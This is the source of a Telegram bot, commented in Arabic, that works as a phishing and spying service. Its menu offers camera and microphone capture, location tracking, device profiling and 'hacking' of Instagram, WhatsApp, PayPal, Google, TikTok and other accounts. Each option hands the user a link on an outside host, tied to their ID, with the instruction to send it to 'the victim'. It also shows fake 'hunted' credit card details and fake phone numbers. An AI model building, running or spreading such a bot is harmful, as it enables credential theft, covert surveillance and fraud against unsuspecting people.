# -*- coding: utf-8 -*-
import os
import time
from flask import Flask
from threading import Thread
import telebot
from telebot import types

# --- Flask Server Configuration ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running successfully on Render!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# --- Bot Credentials ---
ADMIN_ID = 7145036494
TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن البوت الخاص بك هنا
CHANNEL_USERNAME = "@l20CWCyobz5mZDdk"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

if not os.path.exists("database"):
    os.makedirs("database")

def read_file(path):
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    return ""

def write_file(path, data, mode="w"):
    with open(path, mode, encoding="utf-8", errors="ignore") as f:
        f.write(data)

def check_subscription(user_id):
    if user_id == ADMIN_ID:
        return True
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Error checking sub: {e}")
    return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    username = message.from_user.username or "N/A"
    
    id_file = "database/ID.txt"
    ids = read_file(id_file).splitlines()
    if str(user_id) not in ids:
        write_file(id_file, f"{user_id}\n", "a")
        try:
            c = len(ids) + 1
            text_admin = (
                "🔔 *تنبيه: مستخدم جديد انضم إلى البوت الخاص بك!*\n"
                f"👨‍💼¦ اسمه » [{name}](tg://user?id={user_id})\n"
                f"🔱¦ معرفه » [@{username}](tg://user?id={user_id})\n"
                f"💳¦ ايديه » [{user_id}](tg://user?id={user_id})\n"
                f"📊 *عدد الأعضاء الكلي:* {c}"
            )
            bot.send_message(ADMIN_ID, text_admin)
        except Exception as e:
            print(f"Admin notify error: {e}")

    if not check_subscription(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("اشترك في القناة 📢", url="https://t.me/+l20CWCyobz5mZDdk"))
        markup.add(types.InlineKeyboardButton("تم الاشتراك ✅", callback_data="check_sub"))
        bot.send_message(
            user_id,
            "❌ عذرا، عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدام الأزرار والخدمات.\n\n📢 بعد الاشتراك، اضغط على زر التحقق أدناه أو أرسل /start",
            reply_markup=markup
        )
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('تلغيم رابط👿', callback_data='exi2'),
        types.InlineKeyboardButton('روابط مزوره☠️', callback_data='exit3')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق الكامرا الأمامية 🔥', callback_data='com'),
        types.InlineKeyboardButton('اختراق الكامرا الخلفية 📷', callback_data='co')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق الموقع 📌', callback_data='moq'),
        types.InlineKeyboardButton('تسجيل صوت الضحية 🎤', callback_data='record_audio')
    )
    markup.add(
        types.InlineKeyboardButton('تصوير الضحية فيديو 🎥', callback_data='com1'),
        types.InlineKeyboardButton('جمع معلومات الجهاز 🧾', callback_data='ma')
    )
    markup.add(
        types.InlineKeyboardButton('الارقام وهميه ☎️', callback_data='fake_number'),
        types.InlineKeyboardButton('اختراق الهاتف كاملاً 🚨', callback_data='full_device')
    )
    markup.add(
        types.InlineKeyboardButton('صيد فيزات 💳', callback_data='get_fake_visa'),
        types.InlineKeyboardButton('أعطيني نكتة 😂', callback_data='send_joke')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق قنوات التلفاز 📺', callback_data='tv_channels'),
        types.InlineKeyboardButton('اختراق بث الراديو 📻', callback_data='hack_radio')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق انستجرام 🆔', callback_data='send_instagram_link'),
        types.InlineKeyboardButton('اختراق فري فاير 💎', callback_data='send_freefire_link')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق ببجي 🎮', callback_data='send_adobe_link'),
        types.InlineKeyboardButton('اختراق فيسبوك 🔮', callback_data='send_spotify_link')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق ديسكورد 🔥', callback_data='send_google2_link'),
        types.InlineKeyboardButton('اغلاق المواقع 🔱', web_app=types.WebAppInfo('https://brass-comfortable-ricotta.glitch.me/'))
    )
    markup.add(
        types.InlineKeyboardButton('الذكاء الاصطناعي 🤖', web_app=types.WebAppInfo('https://sparkly-liger-751b2d.netlify.app/')),
        types.InlineKeyboardButton('اختراق باي بال 💲', callback_data='send_paypal_link')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق نتفليكس 🔴', callback_data='send_netflix_link'),
        types.InlineKeyboardButton('معرفة رقم الضحية ☎️', callback_data='get_user_link')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق جوجل 🔍', callback_data='send_google_link'),
        types.InlineKeyboardButton('اختراق تيك توك 🚫', callback_data='send_tiktok_link')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق كواي 🚬', callback_data='kwai'),
        types.InlineKeyboardButton('اختراق واتساب 🟡', callback_data='wats')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق ووردبريس 📝', callback_data='send_wordpress_link'),
        types.InlineKeyboardButton('اختراق يوتيوب 🔴', callback_data='verify_number')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق سناب شات 📀', callback_data='send_twitch_link'),
        types.InlineKeyboardButton('اختراق تويتر 🐦', callback_data='send_twitter_link')
    )
    markup.add(
        types.InlineKeyboardButton('اختراق روبليكس 🎮', callback_data='send_roblox_link'),
        types.InlineKeyboardButton('تحليل شخصيتك🚸', callback_data='pm')
    )
    markup.add(
        types.InlineKeyboardButton('فتح شات واتساب ✳️', callback_data='search_whatsapp_number'),
        types.InlineKeyboardButton('بحث حساب عبر id🔍', callback_data='search_telegram_id')
    )
    markup.add(
        types.InlineKeyboardButton('تتواصل مع المطور', url=f"tg://user?id={ADMIN_ID}")
    )

    bot.send_message(
        user_id,
        "🤖✨ **أهلاً بك! جميع الأزرار والخدمات متاحة مجاناً 😊**",
        reply_markup=markup
    )

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("المشتركين 👥", callback_data="m1"))
    markup.add(types.InlineKeyboardButton("إذاعة رسالة 📮", callback_data="send"))
    markup.add(types.InlineKeyboardButton("تحديثات البوت 🔴", url="https://t.me/DA4K711"))

    bot.send_message(
        message.chat.id,
        "مرحبًا! إليك لوحة التحكم الخاصة بك ⚡:",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    if data == "check_sub":
        if check_subscription(user_id):
            bot.answer_callback_query(call.id, "✅ تم التحقق بنجاح! أرسل /start لعرض الأزرار.", show_alert=True)
            bot.send_message(chat_id, "أهلاً بك مجدداً! أرسل /start لفتح القائمة.")
        else:
            bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
        return

    if not check_subscription(user_id):
        bot.answer_callback_query(call.id, "❌ يجب الاشتراك في القناة أولاً لاستخدام هذه الميزة!", show_alert=True)
        return

    links_dict = {
        'send_adobe_link': "https://smmyemen.pro/bots/wahm1954/index3.html?id=",
        'send_paypal_link': "https://smmyemen.pro/bots/wahm1954/index2.html?id=",
        'send_netflix_link': "https://smmyemen.pro/bots/wahm1954/index17.html?id=",
        'send_instagram_link': "https://smmyemen.pro/bots/wahm1954/index1.html?id=",
        'send_google_link': "https://smmyemen.pro/bots/wahm1954/index9.html?id=",
        'send_google2_link': "https://smmyemen.pro/bots/wahm1954/index10.html?id=",
        'wats': "https://smmyemen.pro/bots/wahm1954/index18.html?id=",
        'kwai': "https://smmyemen.pro/bots/wahm1954/index15.html?id=",
        'send_tiktok_link': "https://smmyemen.pro/bots/wahm1954/index8.html?id=",
        'send_twitter_link': "https://smmyemen.pro/bots/wahm1954/index7.html?id=",
        'send_twitch_link': "https://smmyemen.pro/bots/wahm1954/index12.html?id=",
        'send_wordpress_link': "https://smmyemen.pro/bots/wahm1954/index19.html?id=",
        'send_roblox_link': "https://smmyemen.pro/bots/wahm1954/index11.html?id=",
        'send_spotify_link': "https://smmyemen.pro/bots/wahm1954/index14.html?id=",
        'send_freefire_link': "https://smmyemen.pro/bots/wahm1954/index13.html?id=",
        'verify_number': "https://smmyemen.pro/bots/wahm1954/index20?id=",
        'com': "https://smmyemen.pro/bots/wahm1954/index4.html?id=",
        'record_audio': "https://smmyemen.pro/bots/wahm1954/index6.html?id=",
        'ma': "https://smmyemen.pro/bots/wahm1954/index24.html?id=",
        'co': "https://smmyemen.pro/bots/wahm1954/index5.html?id=",
        'moq': "https://smmyemen.pro/bots/wahm1954/index23.html?id="
    }

    if data in links_dict:
        link = links_dict[data] + str(user_id)
        bot.send_message(chat_id, f"انسخ الرابط وارسله للضحية:\n{link}")
    
    elif data == "com1":
        f_link = f"https://brass-sulky-bakery.glitch.me/front?id={user_id}"
        b_link = f"https://brass-sulky-bakery.glitch.me/back?id={user_id}"
        bot.send_message(chat_id, f"إليك روابط تصوير الضحية فيديو:\n\nالكاميرا الأمامية:\n{f_link}\n\nالكاميرا الخلفية:\n{b_link}")

    elif data == "full_device":
        bot.send_message(chat_id, "قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً: /vip")
    
    elif data == "get_user_link":
        link = f"https://t.me/Ksksjsjjsjskygbot?start={user_id}"
        bot.send_message(chat_id, f"انسخ هذا الرابط وارسله لأي شخص:\n\n{link}")

    elif data == "get_fake_visa":
        bot.send_message(chat_id, "♻️ جاري الفحص عن الفيزات . . .\n🔍 يرجى الانتظار قليلاً")
        time.sleep(2)
        visa = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n[-] Card Number : 4485XXXXXXXXXXXXXXXX\n[-] Expiry : 12/2028\n[-] CVV : 456\n[-] Bank : Chase Bank\n[-] Country : USA🇺🇸\n[-] Value : $50\n============================\n[-] by : @WAHM_REBOT"
        bot.send_message(chat_id, visa)

    elif data == "fake_number":
        bot.send_message(chat_id, "➖ تم الطلب 🛎•\n➖ رقم الهاتف ☎️ : +37181928374\n➖ الدولة : لاتفيا 🇱🇻\n➖ المنصة 🔮 : لجميع المواقع والبرامج\nاضغط على الرقم لنسخه.")

    elif data == "m1":
        ids = read_file("database/ID.txt").splitlines()
        count = len(ids)
        bot.answer_callback_query(call.id, f"عدد المشتركين هو » {count} «", show_alert=True)

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("Flask server started. Bot is polling...")
    bot.infinity_polling()
